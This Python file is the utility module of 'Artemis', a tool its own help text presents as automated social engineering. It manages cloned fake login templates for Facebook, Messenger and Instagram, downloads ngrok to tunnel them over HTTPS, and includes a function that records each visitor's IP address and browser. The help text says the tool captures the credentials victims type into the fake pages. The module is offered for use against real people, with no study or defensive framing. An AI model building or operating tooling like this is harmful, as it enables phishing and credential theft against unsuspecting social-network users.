import os
import re
import shutil
import subprocess
import requests
import zipfile
import tarfile


# path constants
CORE_PATH = os.path.join('artemis_server', 'artemis_core')
STATIC_PATH = os.path.join(CORE_PATH, 'static')
TEMPLATE_PATH = os.path.join(CORE_PATH, 'templates')

help_text = """
Artemis - automated Social Engineering tool
v1.0 release, June 2021

Developer: Rezi Gelenidze
Github repository: https://github.com/rezi-gelenidze/artemis

[Description]
Artemis provides automated and flexible phishing functionalities,
you can tunnel any template via secured HTTPS with ngrok tunnel,
you are an able to capture user IP address, browser type and social
network credentials, if the user types in tunneled template form 
(ex. user typed his credentials in your fake Facebook login page). Artemis includes
some popular social network cloned fake templates (Facebook, Messenger, Instagram and etc.),
but it also includes template management system for adding a new template, removing existing,
listing installed templates and analyzing existing template directories and files.


[requirements]
- python3 (python interpreter)
- ngrok (ngrok executable for safe https tunneling)

*required python modules:
- django (python web framework for Artemis server functioning)
- whitenoise (static files manager for django web server)
- requests (python library for web requests)

Artemis automatically installs all required files
and libraries if not installed (except python3)


[commands]

-h | --help
outputs this help text.

$ python3 artemis.py -h

-l | --list [TEMPLATE_NAME]
outputs list of installed templates. If TEMPLATE_NAME is
present, specific template is analyzed and information is listed.

$ python3 artemis.py -l
$ python3 artemis.py -l facebook


-r | --remove [TEMPLATE_NAME]
command for removing existing template and its files.
Command firstly outputs template details and directories,
and asks user if he really wants to remove template.
If user proceeds, all template static and HTML files are removed.

$ python3 artemis.py -r facebook


-d | --deploy [--replace]
manual deploying for Django staticfiles.
This command offers automatic deployment of static files
for Django web server (Django uses whitenoise static file manager).
if command is executed Artemis creates folder for deployed staticfiles if not present,
or merges new staticfiles with existing ones. if --replace argument is provided, old staticfiles
folder is deleted and new one is created with new files only (no merging with old files).

$ python3 artemis.py -d
$ python3 artemis.py -d --replace


-a | --add [TEMPLATE_PATH]
initialized new template from given absolute or relative path (TEMPLATE_PATH), checks its
validity and then asks user to provide name for newly created template.
When name is provided, all valid files are copied in Artemis management
directories and newly copied HTML file is modified to support Django templating
language.

$ python3 artemis.py -a /home/user/Desktop/my_template

[New template content]
when new template is added, artemis scans it's directory,
determines it's validity and tries to copy supported content.
New template must have this filesystem:

- contains at least one HTML file, named "index.html"
- all CSS files are directly stored in "css" directory
- all Javascript files are directly stored in "js" directory
- all media files are directly stored in "media" directory
```
myNewTemplate/
├── index.html
├── css/
│   └── style.css
├── js/
│	└── script.js
└── media/
    ├── background.png
    ├── icon.ico
    └── intro.mp4
```

supported media files:
- image
	- png
	- gif
	- jpeg/jpg
	- webp
	- svg
	- ico
	- bmp
- video
	- mp4
	- ogv
	- mov
	- webm
- audio
	- m4a
	- mp3
	- wav
	- aac
	- ogg
- fonts
	- ttf 
"""


def colorize(color, text):
    colors = {
        'red': '\033[31m',
        'green': '\033[32m',
        'orange': '\033[33m',
        'blue': '\033[34m',
        'endc': '\033[0m'
    }

    code = colors.get(color, '')
    return code + text + colors['endc']


def invalid_option_exit(text):
    print(colorize('red', text))
    print(colorize('orange', 'Run "python3 artemis.py --help" for instructions.'))

    exit()


def remove_prev_lines(n):
    """ CLI line clearing trick for removing previous lines. """
    cursor_up = '\x1b[1A'
    line_remove = '\x1b[2K'
    print((cursor_up + line_remove) * n)


def validate_template_name(name):
    """ Validate template name """
    templates = os.listdir(TEMPLATE_PATH)
    pattern = r'^[a-zA-Z0-9\s]+$'

    matched = re.match(pattern, name)

    if name.lower() in map(lambda a: a.lower(), templates):
        print(colorize('red', 'Template with this name already exists.'))
        return False

    elif not matched:
        print(colorize('red', 'Template name can only contain (a-zA-Z0-9) and whitespaces.'))
        return False
    
    return True
    

def analyze_template(template):
    """ analyze template directory and list files """
    print(colorize('orange', f'Template [{template}] details:\n'))

    # print path details
    print('HTML template files path:')
    print(colorize('orange', os.path.join(TEMPLATE_PATH, template)))

    # path staticfiles if exist
    if template in os.listdir(STATIC_PATH):
        print('Static files path:')
        print(colorize('orange', os.path.join(STATIC_PATH, template)))

    # list HTML
    HTML_FILES = os.listdir(os.path.join(TEMPLATE_PATH, template))

    print(colorize('orange', 'HTML files:'))
    for html in HTML_FILES:
        print(f'\t- {html}')

    # list staticfiles if exist
    if template in os.listdir(STATIC_PATH):        
        static_dir = os.listdir(os.path.join(STATIC_PATH, template))
        file_types = ['css', 'js', 'media']

        # list Staticfiles
        for file_type in file_types:
            if file_type in static_dir:
                print(colorize('orange', f'{file_type.upper()} files:'))

                for file in os.listdir(os.path.join(STATIC_PATH, template, file_type)):
                    print(f'\t- {file}')
            else:
                print(colorize('orange', f'*No {file_type.upper()} files'))    
    else:
        print(colorize('orange', '*No static files'))


def server_collectstatic(replace=False):
    """
        deploy staticfiles for django server,
        if replace is True, current folder is removed and
        redeployed
    """
    print(colorize('orange', 're-deploying Django staticfiles...'))

    if replace:
        deployed_static = os.path.join(CORE_PATH, 'static_deployed')

        # remove old staticfiles if present
        if os.path.exists(deployed_static):
            shutil.rmtree(deployed_static)

    # run django collect static to serve newly added files on Django server
    collectstatic_call = subprocess.Popen(
        ['python3', 'artemis_server/manage.py', 'collectstatic', '--noinput'],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )

    # check results of collectstatic command
    success, _ = collectstatic_call.communicate()

    if success:
        print(colorize('green', 'Staticfiles re-served successfully for server'))

        return True
    else:
        print(colorize('red', 'error while deploying staticfiles.'))
        print(colorize(
            'orange', 'Try running artemis manual deployment with "python3 artemis.py --deploy" or \n \
            "python3 artemis_server/manage.py collectstatic" \n manually to deploy staticfiles for server (Optional)'
        ))

        return False


def add_template(original_template_path):
    """ New (Custom) template adding operation """

    # list target directory if exists
    try:
        target_dirlist = os.listdir(original_template_path)
    except FileNotFoundError:
        invalid_option_exit(f'Invalid template path - [{original_template_path}]')

    print(colorize('orange', 'Analyzing template directory...'))
    # analyze directory
    if 'index.html' not in target_dirlist:
        invalid_option_exit("Template does not contain base 'index.html' file")
    
    # file extension re expressions
    HTML_RE = r'^.*\.(html|htm)$'
    CSS_RE = r'^.*\.css$'
    JS_RE = r'^.*\.js$'
    MEDIA_RE = r'^.*\.(mp4|webm|mov|ogg|ogv|jpg|jpeg|png|gif|bmp|webp|svg|ico|mp3|m4a|wav|aac|ttf)$'

    print(colorize('orange', '\nFiles to be imported in a new template:\n'))

    # catch html files
    HTML_FILES = [item for item in target_dirlist if re.match(HTML_RE, item)]

    # print found HTML files
    print('HTML files:')

    for html in HTML_FILES:
        print('\t- ', html)
    
    # pre-declare file path containers for copying files later
    FILE_TYPES = [('css', CSS_RE), ('js', JS_RE), ('media', MEDIA_RE)]
    FILES = {}

    for file_type, file_regex in FILE_TYPES:
        if file_type in target_dirlist:
            files_dirlist = os.listdir(os.path.join(original_template_path, file_type))

            # search  files in the directory of its type
            FILES[file_type] = [item for item in files_dirlist if re.match(file_regex, item)]

            # print files if exists
            if FILES[file_type]:
                print(f'{file_type.upper()} files:')

                for file in FILES[file_type]:
                    print('\t- ', file)
        else:
            print(colorize('orange', f'\n*No {file_type.upper()} files\n'))

    print(colorize('orange', '\nChoose template name:\n'))

    while True:
        template_name = input(colorize('orange', '(Artemis) $ '))

        # Check if template name is not taken
        if validate_template_name(template_name):
            break
    
    print(colorize('orange', 'Importing Template...'))

    print(colorize('orange', 'Copying Files...'))

    specific_template_path = os.path.join(TEMPLATE_PATH, template_name)

    # copy and format HTML files
    
    # capture src attributes linking local files to format it as a Django template link
    LINK_RE = r'''<[^>]*(?:src|href)\s*=\s*((?:'|")(?:(?:media|css|js)(?:\/|\\)[a-zA-Z0-9\-\?\/\\.\s]+)(?:'|"))[^<]*>'''

    file_head = '{% load static %}\n'

    os.mkdir(specific_template_path)

    def replace(text):
        """ regex sub function for replacing link with django {% static ... %} """
        # matched path ex. -> '"css/style.css"'
        path = text.group(1)
        
        # create django templating language static link - {% static "artemis_core/PATH" %}
        # path[1:-1] -> (original quote characters are removed in path string)
        return text.group().replace(
            path, f"""'{{% static "{os.path.join(template_name, path[1:-1])}" %}}'"""
            )

    for file in HTML_FILES:
        print(colorize('orange', 'Configuring HTML Files'))

        original = os.path.join(original_template_path, file)
        new = os.path.join(specific_template_path, file)

        # read original content
        with open(original, 'r') as html:
            content = html.read()

        # process HTML content
        processed = re.sub(LINK_RE, replace, content)
        
        # save edited HTML file
        with open(new, 'w') as new_html:
            new_html.write(file_head + processed)

    print(colorize('green', 'HTML files successfully configured and copied!'))

    # copy CSS, JS and Media files
    if FILES:
        specific_static_path = os.path.join(STATIC_PATH, template_name)

        # create static directory
        os.mkdir(specific_static_path)

        # copy static files in their own folder, divided by their type
        for file_type, _ in FILE_TYPES:
            # check if specific type exists (css, js, media)
            if file_type in FILES:
                # make directory
                os.mkdir(
                    os.path.join(specific_static_path, file_type)
                )

                # copy files
                for file in FILES[file_type]:
                    shutil.copyfile(
                        os.path.join(original_template_path, file_type, file),
                        os.path.join(specific_static_path, file_type, file)
                    )
            
        print(colorize('green', 'Media files successfully copied!'))
    
    # deploy staticfiles
    deployed = server_collectstatic()

    if deployed:
        print(colorize, 'Template imported successfully')


def list_templates(argv):
    """ -l | --list command functionality (listing initialized templates) """

    templates = os.listdir(TEMPLATE_PATH)

    if len(argv) == 2:
        # if template is not specified, list all templates
        print(colorize('orange', 'Installed templates:'))

        for template in templates:
            print(f'\t- {template}')

        print(colorize('orange', 'Run "python3 artemis.py -l TEMPLATE_NAME" to view specific template details'))
        
    elif len(argv) == 3:
        # if third argument is specified (template name) output template details
        if argv[2] not in templates:
            print(colorize('red', 'Invalid template name'))
            print(colorize('orange', '*Check misspelling and letter case.'))
            exit()

        analyze_template(argv[2])
        print(colorize('red', '\n(WARNING) Any incorrect behavior can break template!\n'))

    else:
        print(help_text)


def remove_template(argv):
    """ artemis -r pr --remove TEMPLATE_NAME functionality, checking and removing template """

    # check command
    if len(argv) == 2:
        print(colorize('orange', 'Usage: python3 artemis.py -r TEMPLATE_NAME'))
        exit()
    
    # assigning template path to a variable
    template = argv[2]

    # check if exists
    templates = os.listdir(TEMPLATE_PATH)

    if template not in templates:
        print(colorize('red', 'Invalid template name..'))
        print(colorize('orange', 'Terminating program.'))
        exit()

    # analyze and print template tree
    analyze_template(template)

    # warn user and prompt
    print(colorize('red', '\n(WARNING) Are you sure you want to remove this template permanently? (y/n)\n'))

    agree = input(shell_head)

    if agree.lower() in ('y', 'yes'):
        # if user agreed remove directories
        static_folder = os.path.join(STATIC_PATH, template)
        html_folder = os.path.join(TEMPLATE_PATH, template)

        print(colorize('orange', 'Removing staticfiles...'))
        shutil.rmtree(static_folder)

        print(colorize('orange', 'Removing HTML templates...'))
        shutil.rmtree(html_folder)

        # redeploy staticfiles
        deployed = server_collectstatic(replace=True)

        if deployed:
            print(colorize("green", 'Template removed successfully!'))


def choose_template():
    """ initialize available template list, print menu and let user to choose one template from them """
    available_templates = {}

    # filter template dirs
    templates = [name for name in os.listdir(TEMPLATE_PATH) if os.path.isdir(os.path.join(TEMPLATE_PATH, name))]

    # append only directories, which contains index.html basefile
    for index, template in zip(range(len(templates)), templates):
        if 'index.html' in os.listdir(os.path.join(TEMPLATE_PATH, template)):
            available_templates[str(index)] = template

    # print menu
    print(colorize('orange', 'Choose template:\n'))

    for index, template in available_templates.items():
        print(f'\t[{index}] {template}')

    print()

    # prompt user to choose one template by its index
    while True:
        chosen = input(shell_head)

        try:
            # if template index is correct stop prompting
            assert chosen.isdigit and chosen in available_templates
            break
        except AssertionError:
            # else prompt again
            print(colorize('red', 'Invalid number...'))
            pass

    # set chosen template as the target template for server
    os.environ['ARTEMIS_SITE'] = available_templates[chosen]


def check_dependencies():
    """ Checking and installing required software (Django, Ngrok) """
    # check django
    try: 
        import django
        import whitenoise
        import requests
    except ModuleNotFoundError:
        print("All required python packages are not installed. Press Enter to install:")

        input(shell_head)
        
        print('Installing modules (running pip)...')

        exit_code = subprocess.call(['pip', 'install', '-r', 'requirements.txt'])

        if exit_code == 0:
            print(colorize('green', 'All packages installed successfully!\n'))

        else:
            print(colorize('red', 'Install failure, alternatively run "pip install -r requirements.txt" manually.\n'))
            exit()

    # check ngrok
    if 'ngrok' not in os.listdir():
        # if ngrok is not downloaded, download it
        print('ngrok is not downloaded, press enter to download:')

        input(shell_head)

        # determine download link by system architecture
        arch = subprocess.run(['uname', '-m'], stdout=subprocess.PIPE).stdout.strip()
        
        if arch == b'x86_64':
            url = 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip'
        elif arch == b'arm':
            url = 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip'
        elif arch == b'aarch64':
            url = 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm64.tgz'
        else:
            url = 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip'

        print('Downloading...')

        # download
        try:
            local_filename = url.split('/')[-1]

            with requests.get(url, stream=True) as r:
                r.raise_for_status()
                with open(local_filename, 'wb') as f:
                    for chunk in r.iter_content(chunk_size=8192): 
                        f.write(chunk)
        except requests.exceptions:
            print(colorize('red', 'Some problem has occurred while downloading ngrok file.'))
            print('Terminating Artemis...')

            exit()

        print(colorize('green', 'Download finished.\n'))
        print('Unzipping...')

        # unzip downloaded ngrok file
        try: 
            if local_filename.endswith('.zip'):
                with zipfile.ZipFile(local_filename, 'r') as zip_ref:
                    zip_ref.extractall()
            elif local_filename.endswith('.tgz'):
                with tarfile.open(local_filename) as tar_archive:
                    tar_archive.extractall()

            subprocess.run(['rm', '-f', local_filename])
        except:
            print('Some problem has occurred while unzipping ngrok file.')
            print('Terminating Artemis...\n')

            exit()

        # add execution permission to ngrok
        subprocess.call(['chmod', '700', 'ngrok'], stdout=subprocess.DEVNULL)

        print(colorize('green', 'Success!\n'))


def analyze(request):
    """
        request - Django request object

        determine client IP address from http
        HTTP_X_FORWARDED_FOR or REMOTE_ADDR headers.
        
        return client ip address string value.
    """
    xff_header = request.META.get('HTTP_X_FORWARDED_FOR')

    if xff_header:
        ip_address = xff_header.split(',')[0]
    else:
        ip_address = request.META.get('REMOTE_ADDR')
    
    browser = request.META.get('HTTP_USER_AGENT')

    return ip_address, browser


def remove_env_var(variable):
    try:
        os.environ[variable]
    except KeyError:
        pass


banner = r"""
                 _                    _      
    /\          | |                  (_)     
   /  \    _ __ | |_  ___  _ __ ___   _  ___ 
  / /\ \  | '__|| __|/ _ \| '_ ` _ \ | |/ __|
 / ____ \ | |   | |_|  __/| | | | | || |\___ 
/_/    \_\|_|    \__|\___||_| |_| |_||_||___/ 
        \\\\\_____________________\'-._
        /////~~~~~~~~~~~~~~~~~~~~~/.-'    v1.0
"""

shell_head = colorize('orange', '(Artemis) $ ')
